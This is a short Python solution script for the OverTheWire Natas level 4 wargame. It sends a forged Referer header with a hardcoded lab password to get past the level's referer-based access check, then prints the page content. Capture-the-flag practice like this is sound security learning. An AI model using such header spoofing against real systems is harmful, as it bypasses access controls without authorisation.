import requests
import bs4

# url to connect to
url = "http://natas4.natas.labs.overthewire.org/"

# creds
username = "natas4"
passwd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

# adding referer header
headers = {"referer": "http://natas5.natas.labs.overthewire.org/"}

# Natas usually has a div with id='content' containing the content
def get_content(res):
    output = bs4.BeautifulSoup(res.text, "lxml").find_all(id="content")[0].get_text().strip()
    print(output)

response = requests.post(url, auth=(username, passwd), headers=headers)
if response.status_code == requests.codes.ok:
    get_content(response)
else:
    print(response.status_code)



